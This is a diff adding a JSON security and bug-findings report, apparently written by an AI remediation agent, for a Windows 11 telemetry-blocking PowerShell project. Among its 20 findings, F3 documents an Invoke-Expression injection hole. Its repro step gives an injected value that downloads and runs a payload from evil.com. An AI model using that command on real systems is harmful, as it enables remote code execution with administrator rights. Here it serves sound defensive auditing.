@@ -1,0 +1,481 @@
+{
+  "schema_version": "1.0",
+  "generated": "2026-03-12T16:51:00Z",
+  "generator": "claude-code security remediation agent",
+  "total_findings": 20,
+  "counts": { "P0": 6, "P1": 7, "P2": 7 },
+  "issues": [
+    {
+      "id": "F1",
+      "severity": "critical",
+      "title": "Firewall rules use DNS hostnames instead of IPs — silently fail to block traffic",
+      "description": "New-NetFirewallRule -RemoteAddress does NOT resolve DNS names. Passing hostnames creates rules that match nothing. Users believe telemetry is blocked when zero traffic is filtered.",
+      "file": "modules/ultimate/firewall-telemetry-blocking/apply.ps1",
+      "line": 36,
+      "root_cause": "Misunderstanding of Windows Firewall API — RemoteAddress expects IPs/CIDR, not hostnames.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Run apply.ps1 on a Windows 11 VM",
+        "Run: Get-NetFirewallRule -Name 'Win11Opt-Block-*' | Get-NetFirewallAddressFilter",
+        "Observe RemoteAddress contains hostname strings, not IPs",
+        "Run: Test-NetConnection -ComputerName vortex-win.data.microsoft.com -Port 443",
+        "Observe: connection succeeds — rule has no effect"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/firewall-apply-fix-F1.ps1",
+        "summary": "Resolve hostnames to IPs via Resolve-DnsName at apply time; store resolved IPs in snapshot for rollback."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P0",
+      "acceptance_criteria": "Rules contain valid IP addresses; Test-NetConnection to telemetry endpoints is blocked; Microsoft Store still works."
+    },
+    {
+      "id": "F2",
+      "severity": "critical",
+      "title": "Rollback backup directory race condition — wrong module state restored",
+      "description": "All rollback scripts use 'find latest backup directory' pattern. If multiple modules create timestamped backups, rollback may restore the wrong module's data.",
+      "file": "runtime/",
+      "line": null,
+      "root_cause": "No module-scoped state tracking; all modules share a flat timestamp-sorted backup root.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Apply minimal layer (creates backup at T1)",
+        "Apply moderate layer (creates backup at T2)",
+        "Rollback minimal layer",
+        "Observe: rollback picks T2 backup (moderate), not T1 (minimal)"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/runtime-state-fix-F2.ps1",
+        "summary": "Implement module-scoped state file: on apply write C:\\ProgramData\\WinOptimizer\\state\\<moduleId>.json with exact backupPath. Rollback reads from state file."
+      },
+      "rollback_difficulty": "moderate",
+      "priority": "P0",
+      "acceptance_criteria": "After applying 2+ modules, rollback of module A reads only module A's state file and restores correct data."
+    },
+    {
+      "id": "F3",
+      "severity": "critical",
+      "title": "godmode.ps1 uses Invoke-Expression — command injection vector",
+      "description": "Invoke-Expression at lines 484, 514, 539 executes arbitrary strings from metadata.yaml. A tampered metadata file can run arbitrary code with Administrator privileges.",
+      "file": "runtime/godmode.ps1",
+      "line": 484,
+      "root_cause": "Using Invoke-Expression to dispatch commands from YAML metadata instead of the call operator (&).",
+      "protected_component_impact": true,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Create malicious metadata.yaml with: previewCommand: 'calc.exe; Invoke-WebRequest http://evil.com/payload.ps1 | iex'",
+        "Run godmode.ps1 --manifest with that module",
+        "Observe: calc.exe launches and payload downloads"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/godmode-fix-F3-F4.ps1",
+        "summary": "Replace all Invoke-Expression with call operator (& $scriptPath). Add whitelist validation for preview commands."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P0",
+      "acceptance_criteria": "PSScriptAnalyzer reports zero PSAvoidUsingInvokeExpression violations. Malicious metadata.yaml preview commands are rejected."
+    },
+    {
+      "id": "F4",
+      "severity": "critical",
+      "title": "godmode.ps1 syntax errors prevent execution on PowerShell 5.1",
+      "description": "Line 571 uses inline if() in parameter position (PS7 only). Line 725 uses '-if' as parameter name (invalid in all PS versions). Both crash the entire orchestrator.",
+      "file": "runtime/godmode.ps1",
+      "line": 571,
+      "root_cause": "Code written for PS7 ternary syntax but target runtime is PS5.1 (per #Requires).",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Open PowerShell 5.1 (built-in on Windows 11)",
+        "Run: .\\runtime\\godmode.ps1 --manifest .\\runtime\\manifests\\minimal.yaml --preview",
+        "Observe: 'Unexpected token if' parse error at line 571"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/godmode-fix-F3-F4.ps1",
+        "summary": "Precompute color variables before Write-Host calls. Replace inline if() with preceding switch/if assignment."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P0",
+      "acceptance_criteria": "Script parses without error on PS5.1: [System.Management.Automation.Language.Parser]::ParseFile(path, [ref]$null, [ref]$errors) returns zero errors."
+    },
+    {
+      "id": "F7",
+      "severity": "critical",
+      "title": "utils.ps1 uses Export-ModuleMember in .ps1 file — runtime crash",
+      "description": "Export-ModuleMember only works inside .psm1 module files. Line 407 of utils.ps1 throws 'can only be called from inside a module' when dot-sourced, breaking the entire runtime.",
+      "file": "runtime/utils.ps1",
+      "line": 407,
+      "root_cause": "File has .ps1 extension but uses module-only cmdlet Export-ModuleMember.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Open PowerShell",
+        "Run: . .\\runtime\\utils.ps1",
+        "Observe: 'Export-ModuleMember: can only be called from inside a module'"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/utils-fix-F7.ps1",
+        "summary": "Remove Export-ModuleMember call. File is dot-sourced, so all functions are naturally available in caller scope."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P0",
+      "acceptance_criteria": "Dot-sourcing utils.ps1 succeeds without error. All functions accessible in caller scope."
+    },
+    {
+      "id": "F9",
+      "severity": "critical",
+      "title": "Missing packaging scripts — release pipeline broken",
+      "description": "release.yml references scripts/package.ps1 and scripts/package-and-sign.ps1 which do not exist. The scripts/ directory is empty. No releases can be published.",
+      "file": ".github/workflows/release.yml",
+      "line": 34,
+      "root_cause": "Scripts referenced in CI were never created.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Push a tag matching v*.*.*",
+        "Observe: release workflow fails at 'Package artifact' step",
+        "Error: scripts/package.ps1 not found"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/scripts-package-fix-F9.ps1",
+        "summary": "Create scripts/package.ps1 with version parameter, archive creation, and checksum generation."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P0",
+      "acceptance_criteria": "Release workflow reaches packaging step without file-not-found error."
+    },
+    {
+      "id": "F5",
+      "severity": "high",
+      "title": "AllowTelemetry=0 silently ineffective on non-Enterprise SKUs",
+      "description": "Setting AllowTelemetry=0 only works on Enterprise/Education editions. On Home/Pro Windows internally clamps to 1. Users believe telemetry is fully disabled when it is not.",
+      "file": "modules/minimal/disable-telemetry/apply.ps1",
+      "line": 56,
+      "root_cause": "No SKU detection before setting registry value.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Run on Windows 11 Pro",
+        "Apply module",
+        "Run gpupdate /force",
+        "Check effective value: still 1"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/telemetry-sku-fix-F5.ps1",
+        "summary": "Add SKU detection via Win32_OperatingSystem.OperatingSystemSKU. Set 0 for Enterprise/Education, 1 for others with user warning."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "On Pro SKU, script sets AllowTelemetry=1 and prints warning. On Enterprise, sets 0."
+    },
+    {
+      "id": "F6",
+      "severity": "high",
+      "title": "90% of documented modules unimplemented (5 of ~55)",
+      "description": "Specification documents describe ~55 optimizations. Only 5 modules exist. This is a skeleton, not production software.",
+      "file": "modules/",
+      "line": null,
+      "root_cause": "Project is early-stage with documentation written ahead of implementation.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Count directories under modules/*/",
+        "Compare with module lists in docs/*_layer_win11.txt"
+      ],
+      "proposed_fix": {
+        "type": "doc",
+        "patch_path": null,
+        "summary": "Implement remaining modules per specification. Track in project board."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "Implementation count matches documentation count per layer."
+    },
+    {
+      "id": "F8",
+      "severity": "high",
+      "title": "Write-Log outputs plaintext — CLAUDE.md requires JSON structured logging",
+      "description": "CLAUDE.md specifies JSON logs with timestamp/layer/operation/result/rollbackRef. Current Write-Log writes plaintext strings.",
+      "file": "runtime/godmode.ps1",
+      "line": 142,
+      "root_cause": "Write-Log was implemented as simple text logger, not aligned to CLAUDE.md spec.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Run any module apply",
+        "Check C:\\ProgramData\\WinOptimizer\\logs\\optimizer-*.log",
+        "Observe: plaintext, not JSON"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/logging-fix-F8.ps1",
+        "summary": "Replace Write-Log with JSON-emitting function per CLAUDE.md spec."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "Each log line is valid JSON with timestamp, level, message, operation, layer, rollbackRef fields."
+    },
+    {
+      "id": "F10",
+      "severity": "high",
+      "title": "Xbox services verify.ps1 logic inverted — flags desired state as failure",
+      "description": "verify.ps1 line 11 checks if StartType -eq 'Disabled' and flags as problem. But apply.ps1 sets to Manual (not Disabled). Verify incorrectly passes for Automatic (re-enabled) services.",
+      "file": "modules/moderate/disable-xbox-services/verify.ps1",
+      "line": 11,
+      "root_cause": "Verify logic tests for wrong target state.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Apply module (sets services to Manual)",
+        "Run verify.ps1",
+        "Observe: flags Manual services as failures, passes Automatic ones"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/xbox-verify-fix-F10.ps1",
+        "summary": "Change logic to check service is Manual or Disabled AND not Running as success state."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "After apply, verify.ps1 returns exit 0. With services Automatic, returns exit 1."
+    },
+    {
+      "id": "F11",
+      "severity": "high",
+      "title": "disable-wer rollback incomplete — DefaultConsent not restored; duplicate in apply",
+      "description": "apply.ps1 sets DefaultConsent=0 (line 47-48, duplicated). rollback.ps1 never restores DefaultConsent from backup. Also apply.ps1 line 48 is an exact duplicate of line 47.",
+      "file": "modules/godmode/disable-wer/rollback.ps1",
+      "line": null,
+      "root_cause": "Rollback script omits DefaultConsent restore. Copy-paste duplicate in apply.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Note DefaultConsent value before apply",
+        "Run apply.ps1",
+        "Run rollback.ps1",
+        "Check DefaultConsent — still 0, not restored"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": "suggested_patches/disable-wer-fix-F11.ps1",
+        "summary": "Remove duplicate line in apply.ps1. Add DefaultConsent backup capture and restore in rollback.ps1."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "After apply+rollback, DefaultConsent equals original value."
+    },
+    {
+      "id": "F12",
+      "severity": "medium",
+      "title": "CI workflows reference nonexistent PowerShell/PowerShell@v2 action",
+      "description": "Both ci.yml and release.yml use 'PowerShell/PowerShell@v2' which does not exist as a GitHub Action. CI fails on startup.",
+      "file": ".github/workflows/ci.yml",
+      "line": 22,
+      "root_cause": "Incorrect action reference. Windows runners include PowerShell by default.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Push to main branch",
+        "Observe: CI lint job fails at 'Setup PowerShell' step"
+      ],
+      "proposed_fix": {
+        "type": "ci",
+        "patch_path": null,
+        "summary": "Remove all 'Setup PowerShell' steps. Use 'shell: pwsh' in run steps."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "CI lint job reaches PSScriptAnalyzer step."
+    },
+    {
+      "id": "F13",
+      "severity": "medium",
+      "title": "CI integration test creates restore point on ephemeral VM",
+      "description": "Checkpoint-Computer in ci.yml may fail on GitHub-hosted runners that don't support System Restore.",
+      "file": ".github/workflows/ci.yml",
+      "line": 80,
+      "root_cause": "No CI environment detection before calling Checkpoint-Computer.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Run CI integration test on GitHub-hosted windows-latest",
+        "Observe: Checkpoint-Computer may throw"
+      ],
+      "proposed_fix": {
+        "type": "ci",
+        "patch_path": null,
+        "summary": "Wrap Checkpoint-Computer in try/catch with CI detection."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "CI integration test runs without error even when System Restore is unavailable."
+    },
+    {
+      "id": "F14",
+      "severity": "medium",
+      "title": "release.yml GPG signing step unreachable",
+      "description": "GPG signing step has 'if: runner.os == Linux' but job runs on self-hosted-windows-signer. Condition never true.",
+      "file": ".github/workflows/release.yml",
+      "line": 51,
+      "root_cause": "Mismatched runner OS condition.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Push release tag",
+        "Observe: GPG signing step is skipped"
+      ],
+      "proposed_fix": {
+        "type": "ci",
+        "patch_path": null,
+        "summary": "Change to 'if: always()' or move GPG step to a Linux job."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "GPG signing step executes on release."
+    },
+    {
+      "id": "F15",
+      "severity": "low",
+      "title": "upload-artifact@v3 deprecated",
+      "description": "Both CI workflows use actions/upload-artifact@v3 and actions/download-artifact@v3 which are deprecated.",
+      "file": ".github/workflows/ci.yml",
+      "line": 57,
+      "root_cause": "Action version not updated.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Check GitHub Actions deprecation warnings in CI run"
+      ],
+      "proposed_fix": {
+        "type": "ci",
+        "patch_path": null,
+        "summary": "Upgrade to actions/upload-artifact@v4 and actions/download-artifact@v4."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "No deprecation warnings in CI."
+    },
+    {
+      "id": "F16",
+      "severity": "medium",
+      "title": "Metadata schema mismatch between CONTRIBUTING.md and actual modules",
+      "description": "CONTRIBUTING.md documents fields like preview_cmd, apply_cmds, rollback_cmds. Actual modules use whatChanges, riskLevel, previewCommand.",
+      "file": "modules/",
+      "line": null,
+      "root_cause": "Documentation and implementation diverged. No CI validation.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Compare CONTRIBUTING.md module schema with any metadata.yaml"
+      ],
+      "proposed_fix": {
+        "type": "doc",
+        "patch_path": null,
+        "summary": "Unify schema. Add CI metadata-validation job with yq/yamllint."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P1",
+      "acceptance_criteria": "All metadata.yaml files pass CI schema validation."
+    },
+    {
+      "id": "F17",
+      "severity": "medium",
+      "title": "No '# RUN INSIDE WINDOWS VM OR CI ONLY' annotations on scripts",
+      "description": "None of the 20 .ps1 files contain the required execution environment annotation.",
+      "file": "modules/",
+      "line": null,
+      "root_cause": "Convention not enforced at time of writing.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "grep -r 'RUN INSIDE WINDOWS' modules/ runtime/"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": null,
+        "summary": "Add header comment to all .ps1 files."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "All .ps1 files contain the annotation header."
+    },
+    {
+      "id": "F18",
+      "severity": "low",
+      "title": "No pre-commit hook for file permissions or linting",
+      "description": "Spec requires non-executable files on Arch build host. No hook enforces this.",
+      "file": ".github/",
+      "line": null,
+      "root_cause": "Hook never created.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Check .git/hooks/ for pre-commit",
+        "Check .pre-commit-config.yaml existence"
+      ],
+      "proposed_fix": {
+        "type": "ci",
+        "patch_path": null,
+        "summary": "Add CI job to fail PRs if files have execute bits set."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "CI blocks PRs with executable-bit files."
+    },
+    {
+      "id": "F19",
+      "severity": "medium",
+      "title": "Idempotency weakness — backup directories accumulate on re-run",
+      "description": "Every apply.ps1 creates new timestamped backup regardless of current state. Re-running accumulates orphan directories.",
+      "file": "modules/",
+      "line": null,
+      "root_cause": "No state check before backup creation.",
+      "protected_component_impact": false,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Run apply.ps1 three times",
+        "Check C:\\ProgramData\\WinOptimizer\\backup\\ — three directories"
+      ],
+      "proposed_fix": {
+        "type": "code",
+        "patch_path": null,
+        "summary": "Check state file before applying. If already applied, warn and exit unless -Force."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "Re-running apply without -Force exits early with 'already applied' message."
+    },
+    {
+      "id": "F20",
+      "severity": "medium",
+      "title": "WaaSMedicSvc (protected component) listed in ultimate spec document",
+      "description": "docs/ultimate_layer_win11.txt line 124 lists WaaSMedicSvc. While marked 'DO NOT DISABLE', its presence in an optimization list creates risk of accidental implementation.",
+      "file": "docs/ultimate_layer_win11.txt",
+      "line": 124,
+      "root_cause": "Protected component referenced in optimization context.",
+      "protected_component_impact": true,
+      "source": ["json", "md"],
+      "repro_steps": [
+        "Read docs/ultimate_layer_win11.txt",
+        "Find WaaSMedicSvc entry"
+      ],
+      "proposed_fix": {
+        "type": "doc",
+        "patch_path": null,
+        "summary": "Remove from doc or move to dedicated 'PROTECTED - NEVER TOUCH' section."
+      },
+      "rollback_difficulty": "easy",
+      "priority": "P2",
+      "acceptance_criteria": "WaaSMedicSvc not listed alongside actionable optimization items."
+    }
+  ]
+}
